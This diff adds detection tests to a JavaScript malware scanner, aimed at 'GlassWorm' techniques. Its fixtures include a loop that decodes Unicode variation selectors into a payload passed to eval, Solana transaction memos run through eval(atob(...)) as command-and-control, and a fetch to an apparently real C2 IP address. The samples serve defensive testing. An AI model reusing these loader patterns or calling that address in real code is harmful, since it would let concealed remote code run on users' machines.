@@ -2375,6 +2375,153 @@ fetch('http://localhost:3000/api/data');
       assert(!t, 'Non-Ollama port should NOT trigger ollama_local_llm');
     } finally { cleanupTemp(tmp); }
   });
+
+  // --- v2.9.1: GlassWorm — Unicode Variation Decoder ---
+
+  await asyncTest('AST: codePointAt + 0xFE00 + 0xE0100 → unicode_variation_decoder', async () => {
+    const tmp = makeTempPkg(`
+const payload = [];
+for (let i = 0; i < encoded.length; i++) {
+  const cp = encoded.codePointAt(i);
+  if (cp >= 0xFE00 && cp <= 0xFE0F) {
+    payload.push(cp - 0xFE00);
+  } else if (cp >= 0xE0100 && cp <= 0xE01EF) {
+    payload.push(cp - 0xE0100 + 16);
+  }
+}
+eval(Buffer.from(payload).toString());
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'unicode_variation_decoder');
+      assert(t, 'Should detect unicode_variation_decoder');
+      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: codePointAt without variation selector consts → NO decoder', async () => {
+    const tmp = makeTempPkg(`
+// Legitimate use of codePointAt
+const cp = str.codePointAt(0);
+if (cp > 0x7F) { console.log('non-ASCII'); }
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'unicode_variation_decoder');
+      assert(!t, 'codePointAt alone should NOT trigger unicode_variation_decoder');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- v2.9.1: GlassWorm — Blockchain C2 Resolution ---
+
+  await asyncTest('AST: Solana import + getSignaturesForAddress + eval → blockchain_c2_resolution CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+const solana = require('@solana/web3.js');
+const conn = new solana.Connection('https://api.mainnet-beta.solana.com');
+const sigs = await conn.getSignaturesForAddress(pubkey);
+const memo = sigs[0].memo;
+eval(atob(memo));
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'blockchain_c2_resolution');
+      assert(t, 'Should detect blockchain_c2_resolution');
+      assert(t.severity === 'CRITICAL', `Expected CRITICAL (with eval), got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Solana import + getTransaction without eval → blockchain_c2_resolution HIGH', async () => {
+    const tmp = makeTempPkg(`
+const { Connection, PublicKey } = require('@solana/web3.js');
+const conn = new Connection('https://api.mainnet-beta.solana.com');
+const tx = await conn.getTransaction(sig);
+console.log(tx.meta.logMessages);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'blockchain_c2_resolution');
+      assert(t, 'Should detect blockchain_c2_resolution');
+      assert(t.severity === 'HIGH', `Expected HIGH (no eval), got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Solana import alone → NO blockchain_c2_resolution', async () => {
+    const tmp = makeTempPkg(`
+const solana = require('@solana/web3.js');
+const conn = new solana.Connection('https://api.mainnet-beta.solana.com');
+const balance = await conn.getBalance(pubkey);
+console.log(balance);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'blockchain_c2_resolution');
+      assert(!t, 'Solana import without C2 method should NOT trigger blockchain_c2_resolution');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- v2.9.1: GlassWorm — Blockchain RPC Endpoint ---
+
+  await asyncTest('AST: Solana mainnet RPC endpoint → blockchain_rpc_endpoint', async () => {
+    const tmp = makeTempPkg(`
+const RPC_URL = 'https://api.mainnet-beta.solana.com';
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'blockchain_rpc_endpoint');
+      assert(t, 'Should detect blockchain_rpc_endpoint for Solana mainnet');
+      assert(t.severity === 'MEDIUM', `Expected MEDIUM, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Infura Ethereum endpoint → blockchain_rpc_endpoint', async () => {
+    const tmp = makeTempPkg(`
+const url = 'https://mainnet.infura.io/v3/YOUR_KEY';
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'blockchain_rpc_endpoint');
+      assert(t, 'Should detect blockchain_rpc_endpoint for Infura');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Regular HTTP URL → NO blockchain_rpc_endpoint', async () => {
+    const tmp = makeTempPkg(`
+const API_URL = 'https://api.example.com/v1/data';
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'blockchain_rpc_endpoint');
+      assert(!t, 'Regular URL should NOT trigger blockchain_rpc_endpoint');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- v2.9.1: GlassWorm — C2 IP detection ---
+
+  await asyncTest('AST: GlassWorm C2 IP → suspicious_domain', async () => {
+    const tmp = makeTempPkg(`
+fetch('http://217.69.3.218/c2');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_domain');
+      assert(t, 'Should detect GlassWorm C2 IP as suspicious_domain');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- v2.9.1: Dynamic import of Solana ---
+
+  await asyncTest('AST: Dynamic import of @solana/web3.js + C2 method → blockchain_c2_resolution', async () => {
+    const tmp = makeTempPkg(`
+const solana = await import('@solana/web3.js');
+const conn = new solana.Connection('https://api.mainnet-beta.solana.com');
+const sigs = await conn.getSignaturesForAddress(pubkey);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'blockchain_c2_resolution');
+      assert(t, 'Should detect blockchain_c2_resolution via dynamic import');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runAstTests };
